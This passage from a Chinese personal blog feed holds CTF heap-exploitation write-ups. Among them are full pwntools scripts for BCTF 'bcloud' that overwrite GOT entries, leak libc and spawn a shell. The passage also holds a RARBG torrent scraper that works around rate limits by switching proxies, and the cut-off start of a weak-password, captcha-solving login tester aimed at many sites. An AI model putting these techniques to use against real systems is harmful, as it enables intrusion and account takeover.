<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102253.png" alt="20210331102253"></p>
<p>bss段：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331130920.png" alt="20210331130920"></p>
<p>整理一下这三个函数，大概能判断出枪支chunk的样子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">size</span><br><span class="line">describtion 	<span class="comment">//size = 0x19</span></span><br><span class="line">name	<span class="comment">//size = 0x1F</span></span><br><span class="line">pre_chunk_ptr</span><br></pre></td></tr></table></figure>
<p>cut_input:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102416.png" alt="20210331102416"><br>
其实就是一个把字符串末尾置为\0…再和add函数的输入部分判断一下，明显有点不安全啊…</p>
<p>大概的思路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在add时溢出伪造指向前一个chunk的指针指向puts_got，调用show_add时就可以泄露puts的地址，获得system的地址</span><br><span class="line">接下来就只需要修改某个函数的got表指向的内容然后试着执行/bin/sh，而要做到这个需要：</span><br><span class="line">2. 把某段内存变成完全可控的chunk，且大小需要满足malloc(0x38)。看了看bss段，发现&quot;.bss:0804A2A8 order_mesg_ptr&quot;好像满足要求，而且这个位置前后也没啥用 </span><br><span class="line">3. 获得了可控的地址后寻找可以篡改的函数got，且要能执行输入的/bin/sh字符串</span><br></pre></td></tr></table></figure>
<p>第一步比较好解决：<br>
用gdb add出两个chunk，数一下就能知道payload该填多少trash<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331165524.png" alt="20210331165524"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">27</span> + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(payload,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: aaa\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys = puts_addr - <span class="number">0x24f00</span></span><br></pre></td></tr></table></figure>
<p>第二步，想要在bss段上构造一个chunk（如下图）的话，</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331183238.png" alt="20210331183238"><br>
（另外还要把order_mesg_ptr看作chunk的size，置为0x40）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;<span class="number">0x3f</span>:</span><br><span class="line">	add(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">	a+=<span class="number">1</span></span><br><span class="line"><span class="comment">#0x3f and leave one here</span></span><br><span class="line">fake_chunk = <span class="number">0x0804A2A8</span></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">27</span>+p32(fake_chunk),<span class="string">&quot;aaaa&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>是很明显的。<br>
但如何能让这块区域能够使用就要考虑free时对next_chunk的判断：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x20</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">100</span>)</span><br><span class="line">add_message(payload)</span><br></pre></td></tr></table></figure>
<p>此时order()后，fastbin接收的（唯一一个）chunk将在下一次malloc时分配出去<br>
随后修改strlen指向的地址就能在cut_input()时getshell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,payload)</span><br><span class="line">add_message(p32(sys)+<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># system(p32(system_addr);&quot;/bin/sh&quot;) = system(p32(system_addr));system(&quot;/bin/sh&quot;);</span></span><br></pre></td></tr></table></figure>
<p>另：写一半把ida关了，且没保存数据orz，所以最后就写的比较快且没有截图了…</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDcyMTQuaHRt">https://bbs.pediy.com/thread-247214.htm<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvZmFzdGJpbl9hdHRhY2svIzIwMTQtaGFja2x1LW9yZW8=">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo<i class="fa fa-external-link-alt"></i></span></p>
<h1>House of Force</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件:</span><br><span class="line">- 能够以溢出等方式修改top chunk的size域</span><br><span class="line">- 自由控制堆分配的大小</span><br><span class="line"></span><br><span class="line">步骤:</span><br><span class="line">1. malloc(100)//随便分配一个chunk</span><br><span class="line">2. 使用溢出修改top chunk的size为一个大数//不会去调用mmap</span><br><span class="line">3. malloc(size)//size=目标地址减去 top chunk 地址，再减去 chunk 头的大小</span><br><span class="line">4. p = malloc(100); p == 目标地址</span><br><span class="line"></span><br><span class="line">摘自0x2l师傅的文章</span><br></pre></td></tr></table></figure>
<h2 id="题">题</h2>
<h3 id="HITCON-TRAININGLAB-11">HITCON TRAININGLAB 11</h3>
<p>略…<br>
相关记录在2021-03-22的日报里</p>
<h3 id="BCTF-bcloud">BCTF-bcloud</h3>
<p>搞了好久…现在是早上五点，不想写了<br>
注释啥的都在exp和ida文件里<br>
有两种方法，主要是把top_chunk指向bss段的content_ptr或content_len，由此可以在里边任意写，更改函数got表指向的内容。</p>
<p>画图和调试很重要！</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span> (<span class="params"><span class="built_in">len</span>, content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">first_heap = u32(p.recv()[<span class="number">68</span>:<span class="number">4</span>+<span class="number">68</span>].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">8</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(first_heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line">topchunk_addr = first_heap + <span class="number">0x48</span>*<span class="number">3</span>			<span class="comment">#这里第一次时候因为看gdb显示每个chunk大小是0x49，就写了0x49*3，但其实那个size应该是包括了pre_use的，因此是0x48</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;topchunk_addr : &quot;</span> + <span class="built_in">hex</span>(topchunk_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line"></span><br><span class="line">target_addr = content_len - <span class="number">8</span>		<span class="comment">#?</span></span><br><span class="line">off_target = target_addr - topchunk_addr</span><br><span class="line">malloc_size = off_target - <span class="number">4</span> -<span class="number">7</span>		<span class="comment">#??</span></span><br><span class="line"></span><br><span class="line">add(malloc_size -<span class="number">4</span> , <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># now, topchunk_addr -&gt; content_len-8	?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关于这个topchunk指向的问题，上下两种方法在调试时，试了malloc几个相近的大小（±0x10），pwndbg的topchunk都指向0x804b000，在后面分配时也没有显示增加了chunk</span></span><br><span class="line"><span class="comment"># 目前还不知道是为啥...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">16</span>)*<span class="number">3</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*(content_ptr - content_len -<span class="number">12</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span></span><br><span class="line"><span class="comment">#create 3 contents, with len==16, contents = free_got_addr, atoi_got_addr, ~</span></span><br><span class="line">add(<span class="number">1000</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#free_got points to puts_plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)		<span class="comment">#puts no.1&#x27;s content, which is atoi_got_addr</span></span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;atoi_addr: &quot;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line">offset = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">sys_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p32(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#泄露puts</span></span><br><span class="line"><span class="comment">## 前面与↑相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line">target_addr = content_ptr </span><br><span class="line">malloc_size = target_addr - topchunk_addr -<span class="number">0x10</span></span><br><span class="line">add(malloc_size, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># topchunk -&gt; content_ptr - 0x8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下部分用gdb查看内存中的内容比较容易搞懂</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x804b130</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload )</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))    <span class="comment">#修改free_got为puts_plt</span></span><br><span class="line">delete(<span class="number">2</span>)   <span class="comment">#输出puts_addr</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_addr = puts_addr - <span class="number">0x24f00</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>做这题的时候感觉很奇怪。首先是第一种泄露atoi的方法，似乎只在给定libc的时候有效，把获得的atoi的地址放进libc database里查的时候查不到对应的libc…而第二种泄露puts的方法就可以正常getshell</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91LzQzNDc2ODgvYmxvZy8zNTYxNzY1">一<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTA1NTg4MDU4">二<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>RARBG上种子收集脚本</title>
    <url>/38266.html</url>
    <content><![CDATA[<p>跟着<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjU5NTguaHRt">使用winafl对迅雷的torrent解析逻辑进行fuzz<i class="fa fa-external-link-alt"></i></span>做的时候收集BT语料库（种子种子…哈哈哈哈哈哈哈哈哈哈哈）的脚本<br>
收集RARBG上的一些.torrent文件</p>
<span id="more"></span>
<p>弄了一半发现这个站对爬虫做了点限制，并且24小时内下载超过100个左右的种子就只能用磁链了</p>
<p>虽然磁链好像能转BT来着，不过没试过</p>
<p>只能手动切换代理，没写自动切换的代码，可参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZTRkNzUyOTQ3NmQ=">https://www.jianshu.com/p/5e4d7529476d<i class="fa fa-external-link-alt"></i></span></p>
<p>讲真选择爬RARBG真是…选了个麻烦的</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kv = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;rarbgmirror.org&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DNT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&quot;&quot;</span></span><br><span class="line">cookie_dict = &#123;i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]: i.split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookie.split(<span class="string">&quot;; &quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;127.0.0.1:7890&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;127.0.0.1:7890&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line">categories = &#123; <span class="string">&quot;movie&quot;</span>: <span class="string">&quot;14;17;42;44;45;46;47;48;50;51;52;54&quot;</span>, <span class="string">&quot;xxx&quot;</span>: <span class="string">&quot;2;4&quot;</span>,<span class="string">&quot;tv&quot;</span>: <span class="string">&quot;2;18;41;49&quot;</span>,</span><br><span class="line">              <span class="string">&quot;game&quot;</span>: <span class="string">&quot;2;27;28;29;30;31;32;40;53&quot;</span>, <span class="string">&quot;music&quot;</span>: <span class="string">&quot;2;23;24;25;26&quot;</span>, <span class="string">&quot;software&quot;</span>: <span class="string">&quot;2;33;34;43&quot;</span>&#125;</span><br><span class="line">opt = [<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;seeders&quot;</span>, <span class="string">&quot;leechers&quot;</span>]</span><br><span class="line">orderby = [<span class="string">&quot;ASC&quot;</span>, <span class="string">&quot;DESC&quot;</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://rarbgmirror.org&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span>():</span></span><br><span class="line">    turl = []</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\\torrent\\url.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        turl.append(i)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> turl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_down</span>(<span class="params">category</span>):</span></span><br><span class="line">    <span class="comment"># ground = get_base()</span></span><br><span class="line">    turl = []</span><br><span class="line">    rr = re.<span class="built_in">compile</span>(<span class="string">r&#x27;href=&quot;/torrent/.*?&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, depth+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> select <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">for</span> order <span class="keyword">in</span> orderby:</span><br><span class="line">                catch = url + <span class="string">r&quot;/torrents.php?category=&quot;</span> + categories[category] + \</span><br><span class="line">                    <span class="string">r&#x27;&amp;search=&amp;order=&#x27;</span> + select + \</span><br><span class="line">                    <span class="string">r&quot;&amp;by=&quot;</span> + order + <span class="string">r&quot;&amp;page=&quot;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(catch)</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    catch, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies, )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="string">&#x27;pure flooding&#x27;</span> <span class="keyword">in</span> r.text) <span class="keyword">or</span> r.status_code != <span class="number">200</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;该换代理了?\n&quot;</span> + catch +</span><br><span class="line">                          <span class="string">&#x27; error:&#x27;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line">                    os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">                    r = requests.get(</span><br><span class="line">                        catch, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies, )</span><br><span class="line">                content = BeautifulSoup(r.text, <span class="string">&#x27;lxml&#x27;</span>).find_all(</span><br><span class="line">                    <span class="string">&#x27;tr&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;lista2&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> res <span class="keyword">in</span> content:</span><br><span class="line">                    stub = rr.findall(<span class="built_in">str</span>(res))[<span class="number">0</span>].replace(</span><br><span class="line">                        <span class="string">r&#x27;href=&quot;/torrent/&#x27;</span>, <span class="string">&quot;&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">                    <span class="comment"># if(stub not in ground):</span></span><br><span class="line"></span><br><span class="line">                    turl.append(stub)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            download(turl,category)</span><br><span class="line">            turl = []</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47m%s %s ,page %s 访问完毕\033[0m&quot;</span> %</span><br><span class="line">                  (categories[category], select, j))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">turl, category</span>):</span></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\\torrent\\url.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> turl:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = requests.get(url=url + <span class="string">&#x27;/torrent/&#x27;</span> + i, headers=kv,</span><br><span class="line">                             cookies=cookie_dict, timeout=<span class="number">300</span>,  proxies=proxies,)</span><br><span class="line">            down_url = re.search(<span class="string">r&#x27;/download.php.*\.torrent&#x27;</span>, p.text).group()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\torrent\miss.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">            f.write(url + <span class="string">&#x27;/torrent/&#x27;</span> + i)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;miss one&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        fname = re.sub(<span class="string">r&#x27;/download.php.*?f=&#x27;</span>, <span class="string">&quot;&quot;</span>, down_url)</span><br><span class="line">        fname = urllib.parse.unquote(fname)</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">r&quot;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&quot;</span>  <span class="comment"># &#x27;/ \ : * ? &quot; &lt; &gt; |&#x27;</span></span><br><span class="line">        fname = re.sub(<span class="built_in">str</span>, <span class="string">&quot;-&quot;</span>, fname)</span><br><span class="line"></span><br><span class="line">        down_url = url + down_url</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            download = requests.get(</span><br><span class="line">            url=down_url, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies,)</span><br><span class="line">        <span class="keyword">except</span> : <span class="comment">#requests.exceptions.RequestException :</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;网不好了？&quot;</span>)</span><br><span class="line">            <span class="built_in">input</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&#x27;pure flooding&#x27;</span> <span class="keyword">in</span> download.text) <span class="keyword">or</span> download.status_code != <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;该换代理了!\n&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">            download = requests.get(</span><br><span class="line">                url=down_url, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies,)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Bruce\Desktop\临时\torrent\\&#x27;</span> +</span><br><span class="line">                     category + <span class="string">r&#x27;\\&#x27;</span> + fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            fname = <span class="string">&#x27;&#x27;</span>.join(random.sample(</span><br><span class="line">                string.ascii_letters + string.digits, <span class="number">8</span>)) + <span class="string">&#x27;.torrent&#x27;</span></span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Bruce\Desktop\临时\torrent\\&#x27;</span> +</span><br><span class="line">                     category + <span class="string">&#x27;\\&#x27;</span> + fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        f.write(download.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47m%s 已保存\033[0m&quot;</span> % (fname))</span><br><span class="line"></span><br><span class="line">        fd.write(i + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> categories.keys():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\torrent\\&quot;</span> + i):</span><br><span class="line">            os.mkdir(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\torrent\\&quot;</span> + i)</span><br><span class="line">        get_down(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># https://www.jianshu.com/p/5e4d7529476d</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>一个用单个弱密码测试大量网站脚本（含图片验证码识别）</title>
    <url>/35069.html</url>
    <content><![CDATA[<p>实习期间写的，能用就行</p>
<span id="more"></span>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pip install dddd_ocr</span></span><br><span class="line"><span class="string">pip install selenium</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Text</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"><span class="keyword">from</span> requests.models <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">url</span>):</span></span><br><span class="line">  </span><br><span class="line">    browser.get(url)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    png = browser.find_element_by_id(<span class="string">&#x27;imgObj&#x27;</span>)  <span class="comment"># 